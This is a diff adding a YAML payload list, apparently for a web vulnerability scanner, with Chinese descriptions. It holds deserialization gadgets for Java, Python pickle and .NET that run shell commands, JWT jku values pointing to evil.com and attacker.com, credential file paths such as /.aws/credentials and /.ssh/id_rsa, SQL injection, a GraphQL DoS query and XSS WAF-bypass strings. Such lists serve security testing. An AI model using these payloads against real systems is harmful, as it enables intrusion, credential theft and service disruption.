@@ -1,0 +1,244 @@
+deserialization:
+  java:
+  - payload: '{"@type":"java.lang.Runtime","x":"x"}'
+    description: Jackson @type 反序列化
+  - payload: '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://127.0.0.1:1389/x","autoCommit":true}'
+    description: fastjson JdbcRowSetImpl JNDI 探测
+  - payload: rO0ABXNyABNqYXZhLnV0aWwuQXJyYXlMaXN0eIHSHZnHYZ0DAAFJAARzaXpleHAAAAACdwQAAAACdAABeHQAAXl4
+    description: Java 原生序列化 BLOB 探测
+  - payload: "¬í\0\x05"
+    description: Java 序列化魔数
+  php:
+  - payload: O:8:"stdClass":0:{}
+    description: PHP 序列化对象（无属性）
+  - payload: O:8:"stdClass":1:{s:4:"evil";s:4:"test";}
+    description: PHP 序列化对象（含属性）
+  - payload: a:1:{i:0;s:4:"test";}
+    description: PHP 序列化数组
+  python:
+  - payload: gASVKQAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjA9lY2hvIHBvY190ZXN0lIWUUpQu
+    description: pickle 协议4 BLOB（posix.system）
+  - payload: 'cos
+
+      system
+
+      (S''echo deserialization_poc''
+
+      tR.'
+    description: pickle raw 命令执行
+  - payload: gASVGAAAAAAAAACMBG1hcnOUjAVsb2Fkc5STlCmFlFKULg==
+    description: marshal.loads 反序列化探针
+dotnet_deserialization:
+  json_net:
+  - payload: '{"$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","MethodParameters":{"$type":"System.Collections.ArrayList,
+      mscorlib","$values":["cmd","/c echo test"]},"ObjectInstance":{"$type":"System.Diagnostics.Process,
+      System"}}'
+    description: Json.NET ObjectDataProvider
+  - payload: '{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process,
+      System","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System","FileName":"cmd","Arguments":"/c
+      echo deser_test"}}}'
+    description: Json.NET __type 反序列化
+  - payload: '{"$type":"System.Security.Claims.ClaimsPrincipal, System.Security.Claims","Identities":{"$type":"System.Collections.Generic.List`1[[System.Security.Claims.ClaimsIdentity,
+      System.Security.Claims]], mscorlib","$values":[{"$type":"System.Security.Claims.ClaimsIdentity,
+      System.Security.Claims"}]}}'
+    description: ClaimsPrincipal Gadget
+  - payload: '{"$type":"System.Activities.Presentation.PropertyEditing.PropertyValue,
+      System.Activities.Presentation","PropertyName":"test"}'
+    description: ActivitySurrogateSelector Gadget
+  viewstate:
+  - payload: /wEy0gAAAHBTTUVYAQAAAEQAAABTWVNURU0uV0VCLlVJLkxPU0ZPUk1BVEVSLFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iMDNmNWY3ZjExZDUwYTNh
+    description: LosFormatter ViewState Payload
+  - payload: AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uV2luZG93cy5EYXRhLk9iamVjdERhdGFQcm92aWRlcgEAAAA=
+    description: BinaryFormatter ObjectDataProvider 探测
+jwt_advanced:
+  kid_path_traversal:
+  - ../../../../etc/passwd
+  - ..\..\..\..\windows\win.ini
+  - '....//....//....//....//etc/passwd'
+  - ..%2F..%2F..%2F..%2Fetc%2Fpasswd
+  - file:///etc/passwd
+  - /dev/null
+  - RCE_KEY
+  - 'null'
+  - key.txt
+  - jwks.json
+  - /proc/self/environ
+  - C:\Windows\System32\drivers\etc\hosts
+  jku_injection:
+  - http://evil.com/jwks.json
+  - https://attacker.com/.well-known/jwks.json
+  - http://127.0.0.1:8080/jwks.json
+  - http://localhost:3000/jwks.json
+  alg_confusion:
+  - alg: none
+  - alg: HS256
+    from: RS256
+  - alg: HS256
+    from: ES256
+  - alg: HS256
+    from: PS256
+  weak_secrets:
+  - secret
+  - secret123
+  - password
+  - admin
+  - '123456'
+  - jwtsecret
+  - mysecret
+  - changeme
+  - default
+  - test
+sensitive_files:
+  git:
+  - /.git/HEAD
+  - /.git/config
+  - /.git/index
+  - /.git/logs/HEAD
+  - /.git/refs/heads/master
+  - /.git/refs/heads/main
+  - /.gitignore
+  env:
+  - /.env
+  - /.env.local
+  - /.env.production
+  - /.env.development
+  - /.env.staging
+  - /.env.example
+  - /.env.backup
+  php_config:
+  - /wp-config.php
+  - /config.php
+  - /settings.inc.php
+  - /wp-config.bak
+  - /config.php.bak
+  java_config:
+  - /application.yml
+  - /application.properties
+  - /application-dev.yml
+  - /application-prod.yml
+  - /bootstrap.yml
+  - /WEB-INF/web.xml
+  dotnet_config:
+  - /appsettings.json
+  - /appsettings.Development.json
+  - /web.config
+  - /app.config
+  package_files:
+  - /package.json
+  - /package-lock.json
+  - /composer.json
+  - /composer.lock
+  - /pom.xml
+  - /requirements.txt
+  - /Gemfile
+  - /go.mod
+  - /Cargo.toml
+  cloud_creds:
+  - /.aws/credentials
+  - /.aws/config
+  - /.ssh/id_rsa
+  - /.ssh/id_rsa.pub
+  - /.ssh/authorized_keys
+  - /.bash_history
+  - /credentials.json
+  - /service-account.json
+  info_files:
+  - /robots.txt
+  - /sitemap.xml
+  - /crossdomain.xml
+  - /security.txt
+  - /.well-known/security.txt
+  api_docs:
+  - /swagger.json
+  - /swagger-ui.html
+  - /openapi.json
+  - /api-docs
+  - /v2/api-docs
+  - /v3/api-docs
+  - /graphql/playground
+  - /graphiql
+  backup:
+  - /backup.zip
+  - /backup.tar.gz
+  - /backup.sql
+  - /db_backup.sql
+  - /dump.sql
+  - /database.sql
+  logs:
+  - /error.log
+  - /access.log
+  - /debug.log
+  - /logs/error.log
+  - /logs/access.log
+sqli:
+  time_based:
+  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--
+    description: MySQL 时间盲注
+  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)#
+    description: 'MySQL 时间盲注 # 注释'
+  - payload: 1' AND pg_sleep(5)--
+    description: PostgreSQL 时间盲注
+  - payload: 1' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--
+    description: PostgreSQL 条件时间盲注
+  - payload: 1' AND dbms_pipe.receive_message(('a'),5)--
+    description: Oracle 时间盲注
+  - payload: 1' WAITFOR DELAY '0:0:5'--
+    description: MSSQL 时间盲注
+  - payload: 1' AND 1=(SELECT COUNT(*) FROM sysusers AS sys1, sysusers AS sys2, sysusers
+      AS sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7,
+      sysusers AS sys8)--
+    description: MSSQL 重查询盲注
+  - payload: 1' AND (SELECT * FROM (SELECT(SLEEP(5)))a) AND '1'='1
+    description: MySQL 双条件盲注
+graphql:
+  alias_dos:
+  - payload: 'query { a0: __typename a1: __typename a2: __typename a3: __typename
+      a4: __typename a5: __typename a6: __typename a7: __typename a8: __typename a9:
+      __typename a10: __typename a11: __typename a12: __typename a13: __typename a14:
+      __typename a15: __typename a16: __typename a17: __typename a18: __typename a19:
+      __typename a20: __typename a21: __typename a22: __typename a23: __typename a24:
+      __typename a25: __typename a26: __typename a27: __typename a28: __typename a29:
+      __typename a30: __typename a31: __typename a32: __typename a33: __typename a34:
+      __typename a35: __typename a36: __typename a37: __typename a38: __typename a39:
+      __typename a40: __typename a41: __typename a42: __typename a43: __typename a44:
+      __typename a45: __typename a46: __typename a47: __typename a48: __typename a49:
+      __typename a50: __typename a51: __typename a52: __typename a53: __typename a54:
+      __typename a55: __typename a56: __typename a57: __typename a58: __typename a59:
+      __typename a60: __typename a61: __typename a62: __typename a63: __typename a64:
+      __typename a65: __typename a66: __typename a67: __typename a68: __typename a69:
+      __typename a70: __typename a71: __typename a72: __typename a73: __typename a74:
+      __typename a75: __typename a76: __typename a77: __typename a78: __typename a79:
+      __typename a80: __typename a81: __typename a82: __typename a83: __typename a84:
+      __typename a85: __typename a86: __typename a87: __typename a88: __typename a89:
+      __typename a90: __typename a91: __typename a92: __typename a93: __typename a94:
+      __typename a95: __typename a96: __typename a97: __typename a98: __typename a99:
+      __typename }'
+    description: GraphQL 别名 DoS（100 次重复查询）
+  - payload: 'query { a1: __typename a2: __typename a3: __typename a4: __typename
+      a5: __typename }'
+    description: GraphQL 别名探测（5 次）
+  - payload: 'query { __typename @skip(if: false) __typename @skip(if: false) __typename
+      @skip(if: false) }'
+    description: GraphQL 指令重复
+xss:
+  waf_bypass:
+  - payload: <img/src=x/onerror=alert(1)>
+    description: Cloudflare 绕过：无空格 img 标签
+  - payload: <svg/onload=alert(1)>
+    description: SVG 事件触发
+  - payload: javascript:alert(1)
+    description: 伪协议触发
+  - payload: '"><img src=x onerror=alert(1)>'
+    description: 引号闭合注入
+  - payload: '''-alert(1)-'''
+    description: 单引号函数调用
+  - payload: <iframe src=javascript:alert(1)>
+    description: iframe 伪协议
+  - payload: <object data=javascript:alert(1)>
+    description: object 伪协议
+  - payload: <embed src=javascript:alert(1)>
+    description: embed 伪协议
+  - payload: <body onload=alert(1)>
+    description: body 事件触发
+  - payload: <input onfocus=alert(1) autofocus>
+    description: input 自动聚焦触发
